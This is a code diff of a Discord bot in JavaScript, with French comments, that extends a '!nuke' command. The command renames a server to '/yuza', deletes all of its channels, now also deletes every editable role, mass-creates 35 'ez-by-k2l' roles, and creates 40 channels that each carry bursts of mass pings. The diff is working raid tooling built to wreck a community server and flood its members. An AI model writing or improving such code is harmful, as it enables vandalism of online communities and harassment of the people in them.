@@ -142,24 +142,30 @@ client.on('messageCreate', async message => {
     }
 
     // ==========================================
-    // 3. COMMANDE !NUKE (Mass Creation + Role Flooding + Pings)
+    // 3. COMMANDE !NUKE (Suppression rôles/salons + Flooding)
     // ==========================================
     if (message.content === '!nuke') {
         if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
 
-        await message.reply("💥 **[NUKE TOTAL]** Saturation maximale en cours...");
+        await message.reply("💥 **[NUKE TOTAL]** Destruction des rôles, salons et saturation en cours...");
 
         try {
             // A. Renommer le serveur en "/yuza"
             await message.guild.setName('/yuza').catch(() => {});
 
             // B. Suppression de tous les anciens salons en parallèle
-            const deletePromises = message.guild.channels.cache.map(channel => channel.delete().catch(() => {}));
-            await Promise.all(deletePromises);
+            const deleteChannelPromises = message.guild.channels.cache.map(channel => channel.delete().catch(() => {}));
+            await Promise.all(deleteChannelPromises);
 
-            // C. Création massive de rôles en parallèle pour saturer l'onglet rôles et les logs
+            // C. Suppression de tous les rôles possibles en parallèle (sauf géré par bot / @everyone / trop haut)
+            const deleteRolePromises = message.guild.roles.cache
+                .filter(role => role.editable && role.id !== message.guild.id)
+                .map(role => role.delete().catch(() => {}));
+            await Promise.all(deleteRolePromises);
+
+            // D. Création massive de nouveaux rôles "ez-by-k2l" en parallèle
             const rolePromises = [];
-            for (let r = 0; r < 30; r++) {
+            for (let r = 0; r < 35; r++) {
                 rolePromises.push(
                     message.guild.roles.create({
                         name: 'ez-by-k2l',
@@ -169,7 +175,7 @@ client.on('messageCreate', async message => {
                 );
             }
 
-            // D. Création de 40 salons avec permissions locales et rafale de 10 pings chacun
+            // E. Création de 40 salons avec permissions locales et rafale de 10 pings chacun
             const createPromises = [];
             for (let i = 0; i < 40; i++) {
                 createPromises.push(
